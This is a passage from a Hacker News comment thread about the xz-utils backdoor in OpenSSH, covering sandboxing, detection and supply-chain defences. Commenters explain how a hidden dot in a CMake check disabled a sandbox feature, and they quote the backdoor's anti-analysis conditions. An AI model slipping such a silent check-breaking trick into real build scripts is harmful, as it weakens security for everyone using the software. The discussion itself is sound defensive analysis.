is particularly challenging to sandbox because if you were to restrict the namespace and apply strict seccomp filters via systemd-nspawn, a user gaining a root shell via sshd (or wanting to sudo&#x2F;su as root) is then perhaps prevented from remotely debugging applications, accessing certain filesystems, interacting with network interfaces, etc depending on what level of sandboxing is applied from systemd-nspawn. This choice is highly user dependent and there are probably only limited sane defaults for someone who has already decided they want to use sshd. For example, sane defaults could include creating dedicated services with sandboxing tailored just for read-only sftp user filesystem access, a separate service for read&#x2F;write sftp user filesystem access, sshd tunneling, unprivileged remote shell access, etc.</div><br/><div id="39882361" class="c"><input type="checkbox" id="c-39882361" checked=""/><div class="controls bullet"><span class="by">nottorp</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39880304">parent</a><span>|</span><a href="#39878184">next</a><span>|</span><label class="collapse" for="c-39882361">[-]</label><label class="expand" for="c-39882361">[1 more]</label></div><br/><div class="children"><div class="content">So for all practical purposes you can&#x27;t sandbox ssh on a developer&#x27;s machine much.</div><br/></div></div></div></div><div id="39878184" class="c"><input type="checkbox" id="c-39878184" checked=""/><div class="controls bullet"><span class="by">onedognight</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39877773">parent</a><span>|</span><a href="#39880304">prev</a><span>|</span><a href="#39879923">next</a><span>|</span><label class="collapse" for="c-39878184">[-]</label><label class="expand" for="c-39878184">[19 more]</label></div><br/><div class="children"><div class="content">&gt; With the right sandboxing techniques, SELinux and mitigations could prevent the attacker from doing anything with root permissions.<p>Please review this commit[0] where the sandbox detection was “improved”.<p>[0] <a href="https:&#x2F;&#x2F;git.tukaani.org&#x2F;?p=xz.git;a=commitdiff;h=328c52da8a2bbb81307644efdb58db2c422d9ba7" rel="nofollow">https:&#x2F;&#x2F;git.tukaani.org&#x2F;?p=xz.git;a=commitdiff;h=328c52da8a2...</a></div><br/><div id="39879156" class="c"><input type="checkbox" id="c-39879156" checked=""/><div class="controls bullet"><span class="by">dolmen</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878184">parent</a><span>|</span><a href="#39878442">next</a><span>|</span><label class="collapse" for="c-39879156">[-]</label><label class="expand" for="c-39879156">[9 more]</label></div><br/><div class="children"><div class="content">I can&#x27;t blame anyone who has missed that dot dissimulated at the beginning of the line.<p><a href="https:&#x2F;&#x2F;git.tukaani.org&#x2F;?p=xz.git;a=commitdiff;h=f9cf4c05edd14dedfe63833f8ccbe41b55823b00" rel="nofollow">https:&#x2F;&#x2F;git.tukaani.org&#x2F;?p=xz.git;a=commitdiff;h=f9cf4c05edd...</a></div><br/><div id="39879248" class="c"><input type="checkbox" id="c-39879248" checked=""/><div class="controls bullet"><span class="by">Muromec</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879156">parent</a><span>|</span><a href="#39879317">next</a><span>|</span><label class="collapse" for="c-39879248">[-]</label><label class="expand" for="c-39879248">[1 more]</label></div><br/><div class="children"><div class="content">I specifically opened this diff to search for a sneaky dot, knowing it’s there, and wasn’t able to find it until I checked the revert patch</div><br/></div></div><div id="39879317" class="c"><input type="checkbox" id="c-39879317" checked=""/><div class="controls bullet"><span class="by">gouggoug</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879156">parent</a><span>|</span><a href="#39879248">prev</a><span>|</span><a href="#39878442">next</a><span>|</span><label class="collapse" for="c-39879317">[-]</label><label class="expand" for="c-39879317">[7 more]</label></div><br/><div class="children"><div class="content">For people like me whose C knowledge is poor, can you explain why this dot is significant? What does it do in actuality?</div><br/><div id="39879350" class="c"><input type="checkbox" id="c-39879350" checked=""/><div class="controls bullet"><span class="by">Denvercoder9</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879317">parent</a><span>|</span><a href="#39879411">next</a><span>|</span><label class="collapse" for="c-39879350">[-]</label><label class="expand" for="c-39879350">[1 more]</label></div><br/><div class="children"><div class="content">It&#x27;s part of a test program used for feature detection (of a sandboxing functionality), and causes a syntax error. That in turn causes the test program to fail to compile, which makes the configure script assume that the sandboxing function is unavailable, and disables support for it.</div><br/></div></div><div id="39879411" class="c"><input type="checkbox" id="c-39879411" checked=""/><div class="controls bullet"><span class="by">loumf</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879317">parent</a><span>|</span><a href="#39879350">prev</a><span>|</span><a href="#39879348">next</a><span>|</span><label class="collapse" for="c-39879411">[-]</label><label class="expand" for="c-39879411">[4 more]</label></div><br/><div class="children"><div class="content">You are looking at a makefile, not C. The C code is in a string that is being passed to a function called `check_c_source_compiles()`, and this dot makes that code not compile when it should have -- which sets a boolean incorrectly, which presumably makes the build do something it should not do.</div><br/><div id="39879907" class="c"><input type="checkbox" id="c-39879907" checked=""/><div class="controls bullet"><span class="by">nurple</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879411">parent</a><span>|</span><a href="#39881535">next</a><span>|</span><label class="collapse" for="c-39879907">[-]</label><label class="expand" for="c-39879907">[2 more]</label></div><br/><div class="children"><div class="content">Interesting that validating the failure reason of an autotools compile check could be a security mitigation...</div><br/><div id="39882222" class="c"><input type="checkbox" id="c-39882222" checked=""/><div class="controls bullet"><span class="by">paulmd</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879907">parent</a><span>|</span><a href="#39881535">next</a><span>|</span><label class="collapse" for="c-39882222">[-]</label><label class="expand" for="c-39882222">[1 more]</label></div><br/><div class="children"><div class="content">This is something that should have unit&#x2F;integration tests inside the tooling itself, yeah. If your assertion is that X function is called &#x2F; in the environment X then the function should return Y then that should be a test especially when it’s load-bearing for security.<p>And tooling is no exception either. You should have tests that your tooling does the things it says on the tin and that things happen when flags are set and things don’t happen when they’re not set, and that the tooling sets the flags in the way you expect.<p>These aren’t even controversial statements in the JVM world etc. Just C tooling is largely still living in the 70s apart from abortive attempts to build the jenga tower even taller like autotools&#x2F;autoconf&#x2F;cmake&#x2F;etc (incomprehensible, may god have mercy on your build). At least hand written make files are comprehensible tbh.</div><br/></div></div></div></div><div id="39881535" class="c"><input type="checkbox" id="c-39881535" checked=""/><div class="controls bullet"><span class="by">saagarjha</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879411">parent</a><span>|</span><a href="#39879907">prev</a><span>|</span><a href="#39879348">next</a><span>|</span><label class="collapse" for="c-39881535">[-]</label><label class="expand" for="c-39881535">[1 more]</label></div><br/><div class="children"><div class="content">Cmake actually but yes</div><br/></div></div></div></div><div id="39879348" class="c"><input type="checkbox" id="c-39879348" checked=""/><div class="controls bullet"><span class="by">ezekg</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879317">parent</a><span>|</span><a href="#39879411">prev</a><span>|</span><a href="#39878442">next</a><span>|</span><label class="collapse" for="c-39879348">[-]</label><label class="expand" for="c-39879348">[1 more]</label></div><br/><div class="children"><div class="content">As far as I can tell, the check is to see if a certain program compiles, and if so, disable something. The dot makes it so that it always fails to compile and thus always disables that something.</div><br/></div></div></div></div></div></div><div id="39878442" class="c"><input type="checkbox" id="c-39878442" checked=""/><div class="controls bullet"><span class="by">Denvercoder9</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878184">parent</a><span>|</span><a href="#39879156">prev</a><span>|</span><a href="#39881343">next</a><span>|</span><label class="collapse" for="c-39878442">[-]</label><label class="expand" for="c-39878442">[3 more]</label></div><br/><div class="children"><div class="content">That one&#x27;s a separate attack vector, which is seemingly unused in the sshd attack. It only disables sandboxing of the xzdec(2) utility, which is not used in the sshd attack.</div><br/><div id="39879237" class="c"><input type="checkbox" id="c-39879237" checked=""/><div class="controls bullet"><span class="by">formerly_proven</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878442">parent</a><span>|</span><a href="#39881343">next</a><span>|</span><label class="collapse" for="c-39879237">[-]</label><label class="expand" for="c-39879237">[2 more]</label></div><br/><div class="children"><div class="content">Which strongly suggests that they planned and&#x2F;or executed more backdoors via Jia Tan’s access.</div><br/><div id="39879382" class="c"><input type="checkbox" id="c-39879382" checked=""/><div class="controls bullet"><span class="by">pja</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879237">parent</a><span>|</span><a href="#39881343">next</a><span>|</span><label class="collapse" for="c-39879382">[-]</label><label class="expand" for="c-39879382">[1 more]</label></div><br/><div class="children"><div class="content">I guess xzdec was supposed to sandbox itself where possible so they disabled the sandbox feature check in the build system so that future payload exploits passed to xzdec wouldn’t have to escape the sandbox in order to do anything useful?<p>Sneaky.</div><br/></div></div></div></div></div></div><div id="39881343" class="c"><input type="checkbox" id="c-39881343" checked=""/><div class="controls bullet"><span class="by">db48x</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878184">parent</a><span>|</span><a href="#39878442">prev</a><span>|</span><a href="#39878789">next</a><span>|</span><label class="collapse" for="c-39881343">[-]</label><label class="expand" for="c-39881343">[1 more]</label></div><br/><div class="children"><div class="content">Yes, but don&#x27;t forget that there are different kinds of sandboxes. SELinux never needs the cooperation of any program running on the system in order to correctly sandbox things. No change to Xz could ever make SELinux less effective.</div><br/></div></div><div id="39878789" class="c"><input type="checkbox" id="c-39878789" checked=""/><div class="controls bullet"><span class="by">glandium</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878184">parent</a><span>|</span><a href="#39881343">prev</a><span>|</span><a href="#39878218">next</a><span>|</span><label class="collapse" for="c-39878789">[-]</label><label class="expand" for="c-39878789">[4 more]</label></div><br/><div class="children"><div class="content">Oh, that one is interesting, because it only breaks it in cmake.</div><br/><div id="39879182" class="c"><input type="checkbox" id="c-39879182" checked=""/><div class="controls bullet"><span class="by">sn</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878789">parent</a><span>|</span><a href="#39878218">next</a><span>|</span><label class="collapse" for="c-39879182">[-]</label><label class="expand" for="c-39879182">[3 more]</label></div><br/><div class="children"><div class="content">I wonder if there is anything else cmake related that should be looked at.<p>Wasn&#x27;t cmake support originally added to xz to use with Windows and MSVC?</div><br/><div id="39879354" class="c"><input type="checkbox" id="c-39879354" checked=""/><div class="controls bullet"><span class="by">glandium</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879182">parent</a><span>|</span><a href="#39878218">next</a><span>|</span><label class="collapse" for="c-39879354">[-]</label><label class="expand" for="c-39879354">[2 more]</label></div><br/><div class="children"><div class="content">But that&#x27;s a check for a Linux feature. So the more interesting question would be, what in the Linux world might be building xz-utils with cmake, I guess using ExternalProject_Add or something similar.</div><br/><div id="39879760" class="c"><input type="checkbox" id="c-39879760" checked=""/><div class="controls bullet"><span class="by">sn</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879354">parent</a><span>|</span><a href="#39878218">next</a><span>|</span><label class="collapse" for="c-39879760">[-]</label><label class="expand" for="c-39879760">[1 more]</label></div><br/><div class="children"><div class="content">Yes this is Linux.<p>At this time we don&#x27;t know exactly how much is affected and what originally drew the attention of the attacker(s).</div><br/></div></div></div></div></div></div></div></div><div id="39878218" class="c"><input type="checkbox" id="c-39878218" checked=""/><div class="controls bullet"><span class="by">ronsor</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878184">parent</a><span>|</span><a href="#39878789">prev</a><span>|</span><a href="#39879923">next</a><span>|</span><label class="collapse" for="c-39878218">[-]</label><label class="expand" for="c-39878218">[1 more]</label></div><br/><div class="children"><div class="content">Well, the definition of &quot;improve&quot; depends on one&#x27;s goals.</div><br/></div></div></div></div><div id="39879923" class="c"><input type="checkbox" id="c-39879923" checked=""/><div class="controls bullet"><span class="by">cryptonector</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39877773">parent</a><span>|</span><a href="#39878184">prev</a><span>|</span><a href="#39879505">next</a><span>|</span><label class="collapse" for="c-39879923">[-]</label><label class="expand" for="c-39879923">[1 more]</label></div><br/><div class="children"><div class="content">This is what PrivSep was supposed to do.  sshd could fork an unprivileged and restricted process to do the signature validation, I suppose.</div><br/></div></div><div id="39877797" class="c"><input type="checkbox" id="c-39877797" checked=""/><div class="controls bullet"><span class="by">junon</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39877773">parent</a><span>|</span><a href="#39879505">prev</a><span>|</span><a href="#39879598">next</a><span>|</span><label class="collapse" for="c-39877797">[-]</label><label class="expand" for="c-39877797">[2 more]</label></div><br/><div class="children"><div class="content">Right, though if I&#x27;m understanding correctly, this is targeting openssl, not just sshd. So there&#x27;s a larger set of circumstances where this could have been exploited. I&#x27;m not sure if it&#x27;s yet been confirmed that this is confined only to sshd.</div><br/><div id="39877845" class="c"><input type="checkbox" id="c-39877845" checked=""/><div class="controls bullet"><span class="by">jeroenhd</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39877797">parent</a><span>|</span><a href="#39879598">next</a><span>|</span><label class="collapse" for="c-39877845">[-]</label><label class="expand" for="c-39877845">[1 more]</label></div><br/><div class="children"><div class="content">The exploit, as currently found, seems to target OpenSSH specifically. It&#x27;s possible that everything involving xz has been compromised, but I haven&#x27;t read any reports that there is a path to malware execution outside of OpenSSH.<p>A quote from the first analysis that I know of (<a href="https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2024&#x2F;03&#x2F;29&#x2F;4" rel="nofollow">https:&#x2F;&#x2F;www.openwall.com&#x2F;lists&#x2F;oss-security&#x2F;2024&#x2F;03&#x2F;29&#x2F;4</a>):<p>&gt; Initially starting sshd outside of systemd did not show the slowdown, despite the backdoor briefly getting invoked. This appears to be part of some countermeasures to make analysis harder.<p>&gt; a) TERM environment variable is not set<p>&gt; b) argv[0] needs to be &#x2F;usr&#x2F;sbin&#x2F;sshd<p>&gt; c) LD_DEBUG, LD_PROFILE are not set<p>&gt; d) LANG needs to be set<p>&gt; e) Some debugging environments, like rr, appear to be detected. Plain gdb appears to be detected in some situations, but not others</div><br/></div></div></div></div><div id="39879598" class="c"><input type="checkbox" id="c-39879598" checked=""/><div class="controls bullet"><span class="by">quotemstr</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39877773">parent</a><span>|</span><a href="#39877797">prev</a><span>|</span><a href="#39878522">next</a><span>|</span><label class="collapse" for="c-39879598">[-]</label><label class="expand" for="c-39879598">[2 more]</label></div><br/><div class="children"><div class="content">Doesn&#x27;t matter. This is a supply chain attack, not a vulnerability arising from a bug. All sandboxing the certificate parsing code would have done is make the author of the backdoor do a little bit more work to hijack the necessarily un-sandboxed supervisor process.<p>Applying the usual exploit mitigations to supply chain attacks won&#x27;t do much good.<p>What will? Kill distribution tarballs. Make every binary bit for bit reproducible from a known git hash. Minimize dependencies. Run whole programs with minimal privileges.<p>Oh, and finally support SHA2 in git to forever forestall some kind of preimage attack against a git commit hash.</div><br/><div id="39879928" class="c"><input type="checkbox" id="c-39879928" checked=""/><div class="controls bullet"><span class="by">nurple</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879598">parent</a><span>|</span><a href="#39878522">next</a><span>|</span><label class="collapse" for="c-39879928">[-]</label><label class="expand" for="c-39879928">[1 more]</label></div><br/><div class="children"><div class="content">Oh boy, do I have the packaging system for you!</div><br/></div></div></div></div><div id="39878522" class="c"><input type="checkbox" id="c-39878522" checked=""/><div class="controls bullet"><span class="by">hellcow</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39877773">parent</a><span>|</span><a href="#39879598">prev</a><span>|</span><a href="#39879674">next</a><span>|</span><label class="collapse" for="c-39878522">[-]</label><label class="expand" for="c-39878522">[2 more]</label></div><br/><div class="children"><div class="content">Another reason to adopt OpenBSD style pledge&#x2F;unveil in Linux.</div><br/><div id="39879067" class="c"><input type="checkbox" id="c-39879067" checked=""/><div class="controls bullet"><span class="by">somat</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39878522">parent</a><span>|</span><a href="#39879674">next</a><span>|</span><label class="collapse" for="c-39879067">[-]</label><label class="expand" for="c-39879067">[1 more]</label></div><br/><div class="children"><div class="content">Would that help? sshd, by design, opens shells. the backdoor payload was basically to open a shell. that is, the very thing that sshd has to do.<p>The pledge&#x2F;unvail system is pretty great, but my understanding is that it do not do anything that the linux equivalent interfaces(seccomp i think) cannot do. It is just a simplified&#x2F;saner interface to the same problem of &quot;how can a program notify the kernel what it&#x27;s scope is?&quot; The main advantage to pledge&#x2F;unveil bring to the table is that they are easy to use and cannot be turned off, optional security isn&#x27;t.</div><br/></div></div></div></div></div></div><div id="39879674" class="c"><input type="checkbox" id="c-39879674" checked=""/><div class="controls bullet"><span class="by">tootie</span><span>|</span><a href="#39877312">parent</a><span>|</span><a href="#39877773">prev</a><span>|</span><a href="#39878872">next</a><span>|</span><label class="collapse" for="c-39879674">[-]</label><label class="expand" for="c-39879674">[4 more]</label></div><br/><div class="children"><div class="content">Mind boggling. How do you even decide what to do with privileges on a billion computers?</div><br/><div id="39879784" class="c"><input type="checkbox" id="c-39879784" checked=""/><div class="controls bullet"><span class="by">junon</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879674">parent</a><span>|</span><a href="#39882074">next</a><span>|</span><label class="collapse" for="c-39879784">[-]</label><label class="expand" for="c-39879784">[1 more]</label></div><br/><div class="children"><div class="content">There&#x27;s a reasonably high chance this was to target a specific machine, or perhaps a specific organization&#x27;s set of machines. After that it could probably be sold off once whatever they were using it for was finished.<p>I doubt we&#x27;ll ever know the intention unless the ABC&#x27;s throw us a bone and tell us the results of their investigation (assuming they&#x27;re not the ones behind it).</div><br/></div></div><div id="39882074" class="c"><input type="checkbox" id="c-39882074" checked=""/><div class="controls bullet"><span class="by">kortilla</span><span>|</span><a href="#39877312">root</a><span>|</span><a href="#39879674">parent</a><span>|</span><a href="#39879784">prev</a><span>|</span><a href="#39879794">next</a><span>|</span><label class="collapse" for="c-39882074">[-]</label><label class="expand" for="c-39882074">[1 more]</label></div><br/><div class="children"><div class="content">There aren’t a billion computers running ssh servers and the ones that do should not be exposed to the general internet. This is a stark reminder of why defense in depth matters.</div><br/></div></div></div></div></div></div><div id="39878872" class="c"><input type="checkbox" id="c-39878872" checked=""/><div class="controls bullet"><span class="by">sega_sai</span><span>|</span><a href="#39877312">prev</a><span>|</span><a href="#39881018">next</a><span>|</span><label class="collapse" for="c-39878872">[-]</label><label class="expand" for="c-39878872">[94 more]</label></div><br/><div class="children"><div class="content">One have question on this is, if the backdoor would not been discovered due to performance issue (which was as I understood it purely an oversight&#x2F;fixable deficiency in the code), what are the chances of discovering this backdoor later, or are there tools that would have picked it up? Those questions are IMO relevant to understand if this kind of backdoor is the first one of the kind, or the first one that was uncovered.</div><br/><div id="39879180" class="c"><input type="checkbox" id="c-39879180" checked=""/><div class="controls bullet"><span class="by">quatrefoil</span><span>|</span><a href="#39878872">parent</a><span>|</span><a href="#39882237">next</a><span>|</span><label class="collapse" for="c-39879180">[-]</label><label class="expand" for="c-39879180">[15 more]</label></div><br/><div class="children"><div class="content">If the exploit wasn&#x27;t baing used, the odds would would be pretty low. They picked the right place to bury it (i.e., effectively <i>outside</i> the codebase, where no auditor ever looks).<p>That said, if you&#x27;re not using it, it defeats the purpose. And the more you&#x27;re using it, the higher the likelihood you will be detected down the line. Compare to Solarwinds.</div><br/><div id="39882524" class="c"><input type="checkbox" id="c-39882524" checked=""/><div class="controls bullet"><span class="by">rigid</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879180">parent</a><span>|</span><a href="#39879644">next</a><span>|</span><label class="collapse" for="c-39882524">[-]</label><label class="expand" for="c-39882524">[1 more]</label></div><br/><div class="children"><div class="content">&gt; where no auditor ever looks<p>Well, software supply chains are a thing.<p>&quot;where no auditor ever <i>is paid</i> to look&quot; would be more correct.</div><br/></div></div><div id="39879644" class="c"><input type="checkbox" id="c-39879644" checked=""/><div class="controls bullet"><span class="by">londons_explore</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879180">parent</a><span>|</span><a href="#39882524">prev</a><span>|</span><a href="#39880681">next</a><span>|</span><label class="collapse" for="c-39879644">[-]</label><label class="expand" for="c-39879644">[8 more]</label></div><br/><div class="children"><div class="content">I suspect I could have used this exact attack against 10,000 random SSH servers spread all over the world, and not be detected.<p>Most people don&#x27;t log TCP connections, and those that do don&#x27;t go through their logs looking for odd certificates in ssh connections.<p>And no common logging at the ssh&#x2F;pam level would have picked this up.<p>Your only chance is some sysadmin who has put &#x27;tripwires&#x27; on certain syscalls like system(), fork() or mmap() looking for anything unusual.<p>Even then, they might detect the attack, yet have no chance at actually finding how the malicious code loaded itself.</div><br/><div id="39882481" class="c"><input type="checkbox" id="c-39882481" checked=""/><div class="controls bullet"><span class="by">guenthert</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879644">parent</a><span>|</span><a href="#39879982">next</a><span>|</span><label class="collapse" for="c-39882481">[-]</label><label class="expand" for="c-39882481">[1 more]</label></div><br/><div class="children"><div class="content">There are those who run sshd on a non-standard port and log all attempts to connect to the standard port though.</div><br/></div></div><div id="39879982" class="c"><input type="checkbox" id="c-39879982" checked=""/><div class="controls bullet"><span class="by">amscanne</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879644">parent</a><span>|</span><a href="#39882481">prev</a><span>|</span><a href="#39879973">next</a><span>|</span><label class="collapse" for="c-39879982">[-]</label><label class="expand" for="c-39879982">[4 more]</label></div><br/><div class="children"><div class="content">There is no ‘system()’ syscall, and fork&#x2F;exec would be extremely common for opensshd — it’s what it does to spawn new shells which go on to do anything.<p>I’m not arguing with the point, but this is a great place to hide — very difficult to have meaningful detection rules even for a sophisticated sysadmin.</div><br/><div id="39881367" class="c"><input type="checkbox" id="c-39881367" checked=""/><div class="controls bullet"><span class="by">ivlad</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879982">parent</a><span>|</span><a href="#39879973">next</a><span>|</span><label class="collapse" for="c-39881367">[-]</label><label class="expand" for="c-39881367">[3 more]</label></div><br/><div class="children"><div class="content">This would be execve() that did not go through PAM dance and end up being privileged process.<p>I _think_ it’ll look very different in ps —-forest output.</div><br/><div id="39881748" class="c"><input type="checkbox" id="c-39881748" checked=""/><div class="controls bullet"><span class="by">amscanne</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39881367">parent</a><span>|</span><a href="#39879973">next</a><span>|</span><label class="collapse" for="c-39881748">[-]</label><label class="expand" for="c-39881748">[2 more]</label></div><br/><div class="children"><div class="content">It’s true that there’s a precise set of circumstances that would be different for the RCE (the lack of a PAM dance prior, same process group &amp; session, no allocation of a pseudo-terminal, etc.). My point was merely that I don’t think they are commonly encoded in rule sets or detection systems.<p>It’s certainly possible, but my guess is sshd is likely to have a lot of open policy. I’m really curious if someone knows different and there <i>are</i> hard detection for those things. (Either way, I bet there will be in the future!)</div><br/><div id="39882021" class="c"><input type="checkbox" id="c-39882021" checked=""/><div class="controls bullet"><span class="by">ivlad</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39881748">parent</a><span>|</span><a href="#39879973">next</a><span>|</span><label class="collapse" for="c-39882021">[-]</label><label class="expand" for="c-39882021">[1 more]</label></div><br/><div class="children"><div class="content">I am trying to figure out if auditctl is expressive enough to catch unexpected execve() from sshd: basically anything other than &#x2F;usr&#x2F;bin&#x2F;sshd (for privsep) executed with auid=-1 should be suspicious.</div><br/></div></div></div></div></div></div></div></div><div id="39879973" class="c"><input type="checkbox" id="c-39879973" checked=""/><div class="controls bullet"><span class="by">matrix_overload</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879644">parent</a><span>|</span><a href="#39879982">prev</a><span>|</span><a href="#39880681">next</a><span>|</span><label class="collapse" for="c-39879973">[-]</label><label class="expand" for="c-39879973">[2 more]</label></div><br/><div class="children"><div class="content">With sufficient data points, you can do A&#x2F;B and see that all affected systems run a specific version of Linux distro, and eventually track it down to a particular package.</div><br/><div id="39880738" class="c"><input type="checkbox" id="c-39880738" checked=""/><div class="controls bullet"><span class="by">bastawhiz</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879973">parent</a><span>|</span><a href="#39880681">next</a><span>|</span><label class="collapse" for="c-39880738">[-]</label><label class="expand" for="c-39880738">[1 more]</label></div><br/><div class="children"><div class="content">Unless you&#x27;re the bad actor, you have no way to trigger the exploit, so you can&#x27;t really do an a&#x2F;b test. You can only confirm which versions of which distros <i>are</i> vulnerable. And that assumes you have sufficient instrumentation in place to know the exploit has been triggered.<p><i>Even then</i>, who actually has a massive fleet of publicly exposed servers all running a mix of distros&#x2F;versions? You might run a small handful of distros, but I suspect anyone running a fleet large enough to actually collect a substantial amount of data probably also has tools to upgrade the whole fleet (or at least large swaths) in one go. Certainly there are companies where updates are the wild west, but the odds that they&#x27;re all accessible to and controllable by a single motivated individual who can detect the exploit is essentially zero.</div><br/></div></div></div></div></div></div><div id="39880681" class="c"><input type="checkbox" id="c-39880681" checked=""/><div class="controls bullet"><span class="by">lll-o-lll</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879180">parent</a><span>|</span><a href="#39879644">prev</a><span>|</span><a href="#39881536">next</a><span>|</span><label class="collapse" for="c-39880681">[-]</label><label class="expand" for="c-39880681">[1 more]</label></div><br/><div class="children"><div class="content">&gt; That said, if you&#x27;re not using it, it defeats the purpose.<p>Not if this was injected by a state actor. My experience with other examples of state actor interference in critical infrastructure, is that the exploit is <i>not</i> used. It’s there as a capability to be leveraged only in the context of military action.</div><br/></div></div><div id="39881536" class="c"><input type="checkbox" id="c-39881536" checked=""/><div class="controls bullet"><span class="by">bandrami</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879180">parent</a><span>|</span><a href="#39880681">prev</a><span>|</span><a href="#39882501">next</a><span>|</span><label class="collapse" for="c-39881536">[-]</label><label class="expand" for="c-39881536">[1 more]</label></div><br/><div class="children"><div class="content">The purpose would presumably be to use this about an hour before the amphibious assault on $WHEREVER begins</div><br/></div></div><div id="39882501" class="c"><input type="checkbox" id="c-39882501" checked=""/><div class="controls bullet"><span class="by">guenthert</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879180">parent</a><span>|</span><a href="#39881536">prev</a><span>|</span><a href="#39880422">next</a><span>|</span><label class="collapse" for="c-39882501">[-]</label><label class="expand" for="c-39882501">[2 more]</label></div><br/><div class="children"><div class="content">Hmmh, brings up the question, if no exploit actually occurred, was a crime committed?   Can&#x27;t the authors claim that they were testing how quickly the community of a thousand eyes would react, you know, for science?</div><br/><div id="39882540" class="c"><input type="checkbox" id="c-39882540" checked=""/><div class="controls bullet"><span class="by">NekkoDroid</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39882501">parent</a><span>|</span><a href="#39880422">next</a><span>|</span><label class="collapse" for="c-39882540">[-]</label><label class="expand" for="c-39882540">[1 more]</label></div><br/><div class="children"><div class="content">That&#x27;s like asking if someone that went into a crowded place with a full-automatic and started shooting at people but &quot;purposefully missing&quot; is just testing how fast law enforcement reacts, you know, for science.<p>After something like 2 years of planning this out and targeted changes this isn&#x27;t something &quot;just done for science&quot;.</div><br/></div></div></div></div><div id="39880422" class="c"><input type="checkbox" id="c-39880422" checked=""/><div class="controls bullet"><span class="by">golergka</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39879180">parent</a><span>|</span><a href="#39882501">prev</a><span>|</span><a href="#39882237">next</a><span>|</span><label class="collapse" for="c-39880422">[-]</label><label class="expand" for="c-39880422">[1 more]</label></div><br/><div class="children"><div class="content">&gt; That said, if you&#x27;re not using it, it defeats the purpose.<p>Not always. Weapons of war are most useful when you don&#x27;t have to actually use them, because others know that you have it. This exploit could be used sparingly to boost a reputation of a state-level actor. Of course, other parties wouldn&#x27;t know about this particular exploit, but they would see your cyber capabilities in the rare occasions where you decided to use it.</div><br/></div></div></div></div><div id="39882237" class="c"><input type="checkbox" id="c-39882237" checked=""/><div class="controls bullet"><span class="by">xlii</span><span>|</span><a href="#39878872">parent</a><span>|</span><a href="#39879180">prev</a><span>|</span><a href="#39878911">next</a><span>|</span><label class="collapse" for="c-39882237">[-]</label><label class="expand" for="c-39882237">[3 more]</label></div><br/><div class="children"><div class="content">Working for about a year in an environment that was exposed to high volume of malevolent IT actors (and some pretty scary ones) I’d say: discovery chances very always pretty high.<p>Keeping veil of secrecy requires unimaginable amount of energy. Same goes with truth consistency. One little slip and everything goes to nothing. Sometimes single sentence can start a chain of reaction and uncover meticulous crafted plan.<p>That’s how crime if fought every day. Whereas police work has limited resources, software is analyzed daily by hobbyists as a hobby, professionals who still do it for a hobby, and professionals for professional reasons.<p>Discovery was bound to happen eventually.<p>XZ attack was very well executed. It’s a master piece. I wouldn’t be surprised if some state agencies would be involved. But it also was incredibly lucky. I know for sure for myself, but also many of my colleagues would go into long journey if found any of issues that are flagged right now.<p>One takeaway is that chance of finding such issue would be impossible if xz&#x2F;liblzma wouldn’t be open source (and yes I am also aware it enabled it in the first place) but imagine this existing in Windows or MacOS.</div><br/><div id="39882547" class="c"><input type="checkbox" id="c-39882547" checked=""/><div class="controls bullet"><span class="by">rigid</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39882237">parent</a><span>|</span><a href="#39878911">next</a><span>|</span><label class="collapse" for="c-39882547">[-]</label><label class="expand" for="c-39882547">[2 more]</label></div><br/><div class="children"><div class="content">&gt; it enabled it in the first place<p>it took roughly two years including social engineering.<p>I&#x27;d say the same approach is <i>much</i> easier in a big software company.</div><br/><div id="39882588" class="c"><input type="checkbox" id="c-39882588" checked=""/><div class="controls bullet"><span class="by">lazyasciiart</span><span>|</span><a href="#39878872">root</a><span>|</span><a href="#39882547">parent</a><span>|</span><a href="#39878911">next</a><span>|</span><label class="collapse" for="c-39882588">[-]</label><label class="expand" for="c-39882588">[1 more]</label></div><br/><div class="children"><div class="content">How do you mean?</div><br/></div></div></div></div></div></div><div id="39878911" class="c"><input type="checkbox" id="c-39878911" checked=""/><div class="controls bullet"><span class="by">wepple</span><span>|</span><a 